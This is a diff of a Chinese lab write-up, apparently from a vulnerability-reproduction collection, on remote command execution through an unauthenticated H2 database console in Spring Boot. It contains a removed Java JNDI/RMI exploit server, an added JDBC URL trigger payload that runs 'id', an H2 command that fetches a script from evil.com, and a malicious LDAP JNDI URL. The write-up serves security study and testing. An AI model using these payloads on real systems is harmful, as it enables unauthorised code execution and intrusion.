@@ -1,72 +1,76 @@
-# H2 Database Console 未授权访问
+# H2 数据库 Web 控制台未授权访问
 
-H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：
+H2数据库是一个Java的嵌入式内存数据库。当Spring Boot配合H2数据库使用时，如果设置了以下选项，其自带的Web管理页面将可以被外部访问，且没有用户验证：
 
 ```
 spring.h2.console.enabled=true
 spring.h2.console.settings.web-allow-others=true
 ```
 
-利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。
+这个管理页面支持使用JNDI加载JDBC驱动，攻击者可以利用JDBC攻击或JNDI注入来执行任意命令。
 
 参考链接：
 
 - <https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e>
+- <https://www.exploit-db.com/exploits/45506>
+- <https://github.com/h2database/h2database/pull/1580>
+- <https://github.com/h2database/h2database/pull/1726>
+- <https://github.com/h2database/h2database/issues/1225>
 
-## 漏洞环境
+## 环境搭建
 
-执行如下命令启动一个Springboot + h2database环境：
+启动一个带有H2数据库和内嵌Tomcat的Spring Boot应用：
 
 ```
 docker compose up -d
 ```
 
-启动后，访问`http://your-ip:8080/h2-console/`即可查看到H2 database的管理页面。
+容器启动后，Spring Boot应用将监听在`http://your-ip:8080`，默认情况下管理页面地址为`http://your-ip:8080/h2-console/`。
 
 ## 漏洞复现
 
-目标环境是Java 8u252，版本较高，因为上下文是Tomcat环境，我们可以参考《[Exploiting JNDI Injections in Java](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)》，使用`org.apache.naming.factory.BeanFactory`加EL表达式注入的方式来执行任意命令。
+这个漏洞有两种利用方式，一种是[JDBC攻击](https://su18.org/post/jdbc-connection-url-attack/)，另一种是[JNDI注入](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)。
 
-```java
-import java.rmi.registry.*;
-import com.sun.jndi.rmi.registry.*;
-import javax.naming.*;
-import org.apache.naming.ResourceRef;
- 
-public class EvilRMIServerNew {
-    public static void main(String[] args) throws Exception {
-        System.out.println("Creating evil RMI registry on port 1097");
-        Registry registry = LocateRegistry.createRegistry(1097);
- 
-        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
-        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
-        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
-        ref.add(new StringRefAddr("forceString", "x=eval"));
-        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
-        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','nslookup jndi.s.artsploit.com']).start()\")"));
- 
-        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
-        registry.bind("Object", referenceWrapper);
-    }
-}
+### JDBC攻击
+
+H2控制台允许用户指定任意JDBC URL。通过指定`jdbc:h2:mem:testdb`并使用JDBC的`init`属性，我们可以在本地内存服务器中执行任意SQL语句。
+
+H2数据库支持一些特殊且危险的命令，例如：
+
+- `RUNSCRIPT FROM 'http://evil.com/script.sql'`
+- `CREATE ALIAS func AS code ...; CALL func ...`
+- `CREATE TRIGGER ... AS code ...`
+
+我们可以使用`CREATE TRIGGER`构造恶意SQL语句，然后将其放入JDBC URL中：
+
+```
+jdbc:h2:mem:testdb;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript
+    var is = java.lang.Runtime.getRuntime().exec("id").getInputStream()
+    var scanner = new java.util.Scanner(is).useDelimiter("\\A")
+    throw new java.lang.Exception(scanner.next())
+$$;
 ```
 
-我们可以借助这个小工具[JNDI](https://github.com/JosephTribbianni/JNDI)简化我们的复现过程。
-
-首先设置JNDI工具中执行的命令为`touch /tmp/success`：
-
-![](3.png)
-
-然后启动`JNDI-1.0-all.jar`，在h2 console页面填入JNDI类名和URL地址：
+在H2控制台中点击"Test Connection"并捕获请求，然后修改请求中的JDBC URL即可成功执行`id`命令。
 
 ![](1.png)
 
-其中，`javax.naming.InitialContext`是JNDI的工厂类，URL `rmi://evil:23456/BypassByEL`是运行JNDI工具监听的RMI地址。
+### JNDI注入
 
-点击连接后，恶意RMI成功接收到请求：
+1.4.198版本及以后的H2控制台中，添加了新的[`-ifNotExists`选项](https://github.com/h2database/h2database/pull/1726)，默认禁用远程数据库创建，这将导致攻击者必须找到一个已存在的H2数据库才能执行上述JDBC攻击。
+
+如果无法找到合适的H2数据库，我们也可以利用JNDI注入来执行任意命令。这里使用[JNDIExploit](https://github.com/vulhub/JNDIExploit)工具来利用这个漏洞。
+
+启动`JNDIExploit`并根据项目文档中给出的信息来填写表单：
 
 ![](2.png)
 
-`touch /tmp/success`已成功执行：
+`javax.naming.InitialContext`是JNDI工厂类名，URL `ldap://172.17.0.1:1389/TomcatBypass/Command/Base64/dG91Y2ggL3RtcC9zdWNjZXNz`是恶意JNDI URL。
+
+点击“Test Connection”后，恶意JNDI服务器收到请求：
+
+![](3.png)
+
+可见，`touch /tmp/success`命令已经成功执行：
 
 ![](4.png)
